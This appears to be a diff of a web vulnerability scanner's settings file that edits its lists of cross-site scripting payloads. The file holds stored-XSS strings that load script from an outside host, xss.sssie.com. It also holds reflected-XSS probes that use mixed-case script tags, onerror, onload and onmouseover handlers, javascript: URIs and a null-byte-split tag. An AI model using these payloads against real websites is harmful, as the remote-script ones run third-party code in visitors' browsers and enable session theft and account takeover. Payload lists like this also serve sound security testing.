@@ -26,11 +26,13 @@ XSSPAYLOAD =['''"><img src=x onerror=s=createElement('script');body.appendChild(
              '''<script src=http://xss.sssie.com/mdBL8b></script>''',
              '''</textarea>'"><script src=http://xss.sssie.com/mdBL8b></script>''']
 
-ReflectXSSPAYLOAD = ['''><sCrIpt>aLeRt(18567)</ScRipt>''',
-                     '''"/><script>alErt(18567)</script><!--''',
-                     '''<img src='1' onerror=alErt(18567)/>''',
-                     '''<i\x00mg src='1' onerror=alErt(18567)/>''',
-                     '''"><body onload=alert(18567)>"''']
+ReflectXSSPAYLOAD = ['''<sCrIpt>aLeRt(18567)</ScRipt>''',
+                     '''"<IMG SRC=JaVaScRiPt:alert(18567)>''',
+                     '''<img src=x onerror=alErt(18567)/>''',
+                     '''<anytag onmouseover=alert(15)>M''',
+                     '''"<body onload=alert(18567)>"''',
+                     '''<a onmouseover="javascript:window.onerror=alert;throw 1>''',
+                     '''xss1678231''']
 VERSION = "1.0.6.47"
 REVISION = getRevisionNumber()
 STABLE = VERSION.count('.') <= 2
